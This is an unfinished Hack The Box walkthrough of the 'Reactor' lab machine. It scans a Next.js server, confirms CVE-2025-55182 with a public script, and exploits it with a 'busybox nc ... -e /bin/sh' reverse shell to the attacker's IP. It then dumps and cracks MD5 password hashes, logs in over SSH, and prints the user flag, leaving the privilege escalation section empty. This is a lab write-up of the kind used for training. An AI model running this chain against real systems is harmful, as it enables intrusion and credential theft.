--- 
title: 'Reactor'
description: 'Walkthrough of the Reactor machine in hack the box'
date: 2026-06-12
difficulty: Easy
authors:
  name: Bilash J. Shahi
  title: Cybersecurity enthusiast
  picture: https://avatars.githubusercontent.com/elodvk
  url: https://purplesec.org
tags:
  - Season 11
  - Linux
  - Easy
  - CVE-2025-55182
image: walkthroughs/reactor_pwned_cert.png
---

![alt text](reactor_pwned_cert.png)

// Description needs to be updated later

## Reconnaissance

### Network Mapping

```bash
nmap -sC -sV -p- -T4 -oA reactor_ 10.129.103.34
```

Output:
```
Nmap scan report for 10.129.103.34
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Sat, 13 Jun 2026 04:26:55 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Sat, 13 Jun 2026 04:26:56 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=6/13%Time=6A2CDADE%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Sat,\x2013\x20Jun\x202026\x2004:26:55\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
SF:js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptio
SF:ns,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rou
SF:ter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetc
SF:h\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20n
SF:o-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Sat,
SF:\x2013\x20Jun\x202026\x2004:26:56\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20R
SF:SC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-
SF:Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x
SF:20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r
SF:\nDate:\x20Sat,\x2013\x20Jun\x202026\x2004:26:56\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 546.28 seconds

```

2 open ports were found - 22/tcp - SSH, 3000/tcp - HTTP.

### Web Server

```shell
curl -I http://10.129.103.34:3000
```

Output:
```
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000, 
ETag: "p02u6gnhufd8t"
Content-Type: text/html; charset=utf-8
Content-Length: 17175
Date: Sat, 13 Jun 2026 04:19:08 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```


```shell
nuclei -target http://10.129.103.34:3000/
```

Output:
```

```


Clone the github repo:

```shell
git clone https://github.com/freeqaz/react2shell.git
```

Confirm the vulnerability:

```shell
./detect.sh http://10.129.103.34:3000
```

Output:
```
[*] React2Shell Detection Probe (CVE-2025-55182 / CVE-2025-66478)
[*] Target: http://10.129.103.34:3000

[*] HTTP Status: 500
[!] VULNERABLE - Server returned 500 with E{"digest" pattern

[*] Response body:
0:{"a":"$@1","f":"","b":"L3bimJe_3LvBcFWAnK5L4"}
1:E{"digest":"1181338971"}

[!] This server is running a vulnerable version of React RSC / Next.js
[!] Upgrade to Next.js 16.0.7+ or React 19.2.1+ immediately

```

Exploit

Start the listener on the attacker machine:

```shell
nc -lvnp 4444
```

Then run the exploit to start a reverse shell:

```shell
./exploit-redirect.sh -q http://10.129.103.34:3000 "busybox nc 10.10.14.72 4444 -e /bin/sh"
```

REverse shell is established successfully:

```
listening on [any] 4444 ...
connect to [10.10.14.72] from (UNKNOWN) [10.129.103.34] 42918
id
uid=999(node) gid=988(node) groups=988(node)
```

directory listing, we were able to find a file called `reactor.db`.

```shell
ls -l
total 60
drwxr-xr-x  2 node node  4096 Dec 28 20:47 app
-rw-r--r--  1 node node   172 Dec 28 20:47 next.config.js
drwxr-xr-x 30 node node  4096 Dec 28 20:47 node_modules
-rw-r--r--  1 node node   269 Dec 28 20:47 package.json
-rw-r--r--  1 node node 29329 Dec 28 20:47 package-lock.json
-rw-r-----  1 node node 12288 Dec 28 21:03 reactor.db
```

Inside of the databse, we see 2 tables:

```
sqlite3 ./reactor.db "SELECT name FROM sqlite_schema WHERE type='table' ORDER BY name;"
sensor_logs
users
```

users table seems interesting, so I am going to extract everything from that table

```shell
sqlite3 ./reactor.db "SELECT * FROM users;"
```

We are able to find 2 users and their password hashes:

Output:
```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

Both password hashes are in MD5 format, so I am going to crack them using hashcat.

```shell
hashcat -a 0 -m 0 hashes /usr/share/wordlists/rockyou.txt --quiet
```

Password for engineer is `reactor1`.

Output:
```
39d97110eafe2a9a68639812cd271e8e:reactor1
```

Testing ssh with engineer account

```shell
netexec ssh 10.129.103.34 -u engineer -p reactor1
```

Output:
```
SSH         10.129.103.34   22     10.129.103.34    [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16
SSH         10.129.103.34   22     10.129.103.34    [+] engineer:reactor1  Linux - Shell access!
```

SSH was successful:

```shell
┌──(kali㉿kali)-[~/htb/reactor]
└─$ ssh engineer@10.129.103.34                      
The authenticity of host '10.129.103.34 (10.129.103.34)' can't be established.
ED25519 key fingerprint is: SHA256:9v9mCPC4gn2EN/IbKKwhV8KZoNVTsVPorFhlTkNByPM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.103.34' (ED25519) to the list of known hosts.
engineer@10.129.103.34's password: 
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Sat Jun 13 15:12:06 2026 from 10.10.14.72
engineer@reactor:~$ 

```

User flag was found in the engineer home directory:

```shell
engineer@reactor:~$ cat user.txt

Output:
```
d8822d83329d83505e0aad6786530b9c
```

Privilege escalation

```shell

```